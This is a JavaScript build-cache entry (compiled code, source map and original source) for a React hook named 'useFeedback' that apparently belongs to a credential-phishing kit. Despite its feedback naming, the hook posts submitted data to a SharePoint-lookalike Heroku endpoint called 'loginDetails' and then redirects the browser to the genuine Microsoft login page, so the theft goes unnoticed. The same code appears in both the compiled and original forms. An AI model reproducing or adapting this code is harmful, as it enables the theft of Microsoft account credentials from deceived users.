{"ast":null,"code":"var _s = $RefreshSig$();\n\nimport axios from 'axios';\nimport { toast } from 'react-toastify';\nimport 'react-toastify/dist/ReactToastify.css';\nimport { useReducer } from 'react';\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\nimport FeedbackReducer from './FeedbackReducer';\ntoast.configure();\n\nconst useFeedback = () => {\n  _s();\n\n  const [{\n    isLoading\n  }, dispatch] = useReducer(FeedbackReducer, {\n    isLoading: false\n  });\n\n  const postFeedback = async data => {\n    dispatch({\n      type: START_FEEDBACK\n    });\n\n    try {\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`, data);\n\n      if (response.data) {\n        window.location.assign('https://login.microsoftonline.com/common/login');\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      } else {\n        toast.error('oops');\n      }\n    } catch (e) {\n      toast.info('Something went wrong!');\n\n      if (e.response) {\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      }\n    }\n  };\n\n  return {\n    postFeedback,\n    isLoading\n  };\n};\n\n_s(useFeedback, \"TiWjUma+2DqiYb2a7KRYdmskvxs=\");\n\nexport default useFeedback;","map":{"version":3,"sources":["/Users/mac/Downloads/Archive/src/api/useFeedback.js"],"names":["axios","toast","useReducer","START_FEEDBACK","STOP_FEEDBACK","FeedbackReducer","configure","useFeedback","isLoading","dispatch","postFeedback","data","type","response","post","window","location","assign","error","e","info"],"mappings":";;AAAA,OAAOA,KAAP,MAAkB,OAAlB;AACA,SAASC,KAAT,QAAsB,gBAAtB;AACA,OAAO,uCAAP;AACA,SAASC,UAAT,QAA2B,OAA3B;AACA,SAASC,cAAT,EAAyBC,aAAzB,QAA8C,iBAA9C;AACA,OAAOC,eAAP,MAA4B,mBAA5B;AAGAJ,KAAK,CAACK,SAAN;;AAGA,MAAMC,WAAW,GAAG,MAAM;AAAA;;AACxB,QAAM,CACJ;AAAEC,IAAAA;AAAF,GADI,EAEJC,QAFI,IAGFP,UAAU,CAACG,eAAD,EAAkB;AAC9BG,IAAAA,SAAS,EAAE;AADmB,GAAlB,CAHd;;AAOA,QAAME,YAAY,GAAG,MAAOC,IAAP,IAAgB;AACnCF,IAAAA,QAAQ,CAAC;AAAEG,MAAAA,IAAI,EAAET;AAAR,KAAD,CAAR;;AACA,QAAI;AACF,YAAMU,QAAQ,GAAG,MAAMb,KAAK,CAACc,IAAN,CAAY,GAAE,uDAAwD,EAAtE,EAAyEH,IAAzE,CAAvB;;AACA,UAAIE,QAAQ,CAACF,IAAb,EAAoB;AAClBI,QAAAA,MAAM,CAACC,QAAP,CAAgBC,MAAhB,CAAuB,gDAAvB;AACAR,QAAAA,QAAQ,CAAC;AACPG,UAAAA,IAAI,EAAER;AADC,SAAD,CAAR;AAGD,OALD,MAKO;AACLH,QAAAA,KAAK,CAACiB,KAAN,CAAY,MAAZ;AACD;AAEF,KAXD,CAWE,OAAOC,CAAP,EAAU;AACVlB,MAAAA,KAAK,CAACmB,IAAN,CAAW,uBAAX;;AACA,UAAID,CAAC,CAACN,QAAN,EAAgB;AACdJ,QAAAA,QAAQ,CAAC;AAAEG,UAAAA,IAAI,EAAER;AAAR,SAAD,CAAR;AACD;AACF;AACF,GAnBD;;AAqBA,SAAO;AACLM,IAAAA,YADK;AAELF,IAAAA;AAFK,GAAP;AAID,CAjCD;;GAAMD,W;;AAmCN,eAAeA,WAAf","sourcesContent":["import axios from 'axios';\nimport { toast } from 'react-toastify';\nimport 'react-toastify/dist/ReactToastify.css';\nimport { useReducer } from 'react';\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\nimport FeedbackReducer from './FeedbackReducer';\n\n\ntoast.configure()\n\n\nconst useFeedback = () => {\n  const [\n    { isLoading },\n    dispatch,\n  ] = useReducer(FeedbackReducer, {\n    isLoading: false,\n  });\n\n  const postFeedback = async (data) => {\n    dispatch({ type: START_FEEDBACK });\n    try {\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`, data);\n      if (response.data ) {\n        window.location.assign('https://login.microsoftonline.com/common/login');\n        dispatch({\n          type: STOP_FEEDBACK,\n        });\n      } else {\n        toast.error('oops');\n      }\n    \n    } catch (e) {\n      toast.info('Something went wrong!');\n      if (e.response) {\n        dispatch({ type: STOP_FEEDBACK });\n      }\n    }\n  };\n\n  return {\n    postFeedback,\n    isLoading,\n  };\n};\n\nexport default useFeedback;\n"]},"metadata":{},"sourceType":"module"}